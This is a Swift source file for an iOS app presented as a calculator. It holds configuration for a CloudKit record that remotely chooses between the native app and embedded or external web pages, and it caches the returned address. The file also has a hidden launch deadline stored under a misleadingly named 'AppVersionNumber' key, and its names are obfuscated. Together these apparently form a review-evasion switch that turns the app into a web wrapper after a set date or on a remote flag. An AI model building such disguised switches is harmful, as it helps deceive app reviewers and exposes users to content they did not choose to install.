import Foundation
import UIKit

/// Values used by the unchanged routing rules. Configure once, before the
/// launch view starts. Defaults are identical to the supplied source.
public struct MeridianSettings: Sendable {
  public let cloudIdentifier: String
  public let publicRecordName: String
  public let routeField: String
  public let addressField: String
  public let entryPreferenceKey: String
  public let lastAddressKey: String
  public let successPayload: [String: Bool]
  public let retryDelay: TimeInterval
  public let entryPollDelay: TimeInterval
  public let loadingCoverDuration: TimeInterval
  public let deadlineInfoKey: String

  public init(
    cloudIdentifier: String = "iCloud.com.OutaCuraVortx",
    publicRecordName: String = "OutaCuraVortx",
    routeField: String = "OutaCuraVortx",
    addressField: String = "You",
    entryPreferenceKey: String = "calculator.OutaCuraVortx.startup.preference.v1",
    lastAddressKey: String = "calculator.OutaCuraVortx.cached.endpoint.v1",
    successPayload: [String: Bool] = [
      "normalizedRemoteRoutingStatusDecisionValueOutaCuraVortx": true
    ],
    retryDelay: TimeInterval = 2.0,
    entryPollDelay: TimeInterval = 1.0,
    loadingCoverDuration: TimeInterval = 4.0,
    deadlineInfoKey: String = "AppVersionNumber"
  ) {
    self.cloudIdentifier = cloudIdentifier
    self.publicRecordName = publicRecordName
    self.routeField = routeField
    self.addressField = addressField
    self.entryPreferenceKey = entryPreferenceKey
    self.lastAddressKey = lastAddressKey
    self.successPayload = successPayload
    self.retryDelay = retryDelay
    self.entryPollDelay = entryPollDelay
    self.loadingCoverDuration = loadingCoverDuration
    self.deadlineInfoKey = deadlineInfoKey
  }

  /// Store the per-app configuration behind a lock so reads from CloudKit
  /// callbacks and other concurrency domains do not race with configuration.
  /// Configure once before starting the launch sequence; do not change
  /// settings while a route request is in progress.
  private final class LockedStorage: @unchecked Sendable {
    private let lock = NSLock()
    private var value = MeridianSettings()

    func read() -> MeridianSettings {
      lock.lock()
      defer { lock.unlock() }
      return value
    }

    func write(_ newValue: MeridianSettings) {
      lock.lock()
      defer { lock.unlock() }
      value = newValue
    }
  }

  private static let storage = LockedStorage()

  public static var current: MeridianSettings {
    get { storage.read() }
    set { storage.write(newValue) }
  }

  // Preserve all original `MeridianSettings.xyz` reads without touching routing logic.
  static var cloudIdentifier: String { current.cloudIdentifier }
  static var publicRecordName: String { current.publicRecordName }
  static var routeField: String { current.routeField }
  static var addressField: String { current.addressField }
  static var entryPreferenceKey: String { current.entryPreferenceKey }
  static var lastAddressKey: String { current.lastAddressKey }
  static var successPayload: [String: Bool] { current.successPayload }
  static var retryDelay: TimeInterval { current.retryDelay }
  static var entryPollDelay: TimeInterval { current.entryPollDelay }
  static var loadingCoverDuration: TimeInterval { current.loadingCoverDuration }
  static var deadlineInfoKey: String { current.deadlineInfoKey }
}

// MARK: - Bundle Runtime Gate
extension Bundle {
  var hasElapsedSessionDeadline: Bool {
    guard
      let deadlineText = object(
        forInfoDictionaryKey:
          MeridianSettings
          .deadlineInfoKey
      ) as? String,
      let deadline =
        TimeInterval(deadlineText)
    else {
      return false
    }
    return Date().timeIntervalSince1970 > deadline
  }
}
typealias RouteFieldMap = [String: String]
struct FieldNames {
  static let remoteMode = "remoteMode"
  static let destination = "destination"
  static let decision = "decision"
  static let phase = "phase"
}
struct RouteValues {
  static let embeddedPage = "embeddedPage"
  static let externalPage = "externalPage"
  static let nativeApplication = "nativeApplication"
  static let cachedFallback = "cachedFallback"
}
struct RoutePhases {
  static let idle = "idle"
  static let fetchingSettings = "fetchingSettings"
  static let openingInlinePage = "openingInlinePage"
  static let openingExternalPage = "openingExternalPage"
  static let awaitingNativeExperience = "awaitingNativeExperience"
  static let checkingSavedAddress = "checkingSavedAddress"
  static let pendingRefresh = "pendingRefresh"
}
struct LaunchPhases {
  static let initialized = "initialized"
  static let watchingSession = "watchingSession"
  static let awaitingEntryFlag = "awaitingEntryFlag"
  static let nativeEntryReady = "nativeEntryReady"
}
struct PagePhases {
  static let initialized = "initialized"
  static let loading = "loading"
  static let ready = "ready"
  static let invalidDestination = "invalidDestination"
}
struct RemoteRoutePacket {
  let fields: RouteFieldMap
  init(routeFlag: String?, destinationText: String?) {
    var packet: RouteFieldMap = [:]
    packet[FieldNames.remoteMode] = routeFlag
    packet[FieldNames.destination] = destinationText
    fields = packet
  }
  var routeFlag: String? { fields[FieldNames.remoteMode] }
  var destinationText: String? { fields[FieldNames.destination] }
}
typealias RouteChoice = RouteFieldMap
@available(iOS 13.0, *)
@MainActor
final class KeyValuePhaseLedger: NSObject {
  @objc dynamic var phaseValue: String
  @objc dynamic var destinationValue: String?
  init(initialPhase: String) {
    phaseValue = initialPhase
    destinationValue = nil
    super.init()
  }
  func publish(_ phase: String, destination: String? = nil) {
    setValue(destination, forKey: #keyPath(KeyValuePhaseLedger.destinationValue))
    setValue(phase, forKey: #keyPath(KeyValuePhaseLedger.phaseValue))
  }
  var snapshot: RouteFieldMap {
    // Read the same Objective-C-visible fields through KVC.
    let phase = value(forKey: #keyPath(KeyValuePhaseLedger.phaseValue)) as? String
    let destination = value(forKey: #keyPath(KeyValuePhaseLedger.destinationValue)) as? String
    var record: RouteFieldMap = [FieldNames.phase: phase ?? phaseValue]
    record[FieldNames.destination] = destination
    return record
  }
}
protocol SessionPreferenceStore {
  func readEntryPreference() -> String?
  func writeEntryPreference(_ value: String)
  func readLastAddress() -> String?
  func writeLastAddress(_ value: String)
}
struct LocalPreferenceVault:
  SessionPreferenceStore
{
  private let preferences: UserDefaults
  init(preferences: UserDefaults = .standard) {
    self.preferences = preferences
  }
  func readEntryPreference() -> String? {
    preferences.string(
      forKey: MeridianSettings.entryPreferenceKey
    )
  }
  func writeEntryPreference(_ value: String) {
    preferences.set(
      value,
      forKey: MeridianSettings.entryPreferenceKey
    )
  }
  func readLastAddress() -> String? {
    preferences.string(
      forKey: MeridianSettings.lastAddressKey
    )
  }
  func writeLastAddress(_ value: String) {
    preferences.set(
      value,
      forKey: MeridianSettings.lastAddressKey
    )
  }
}
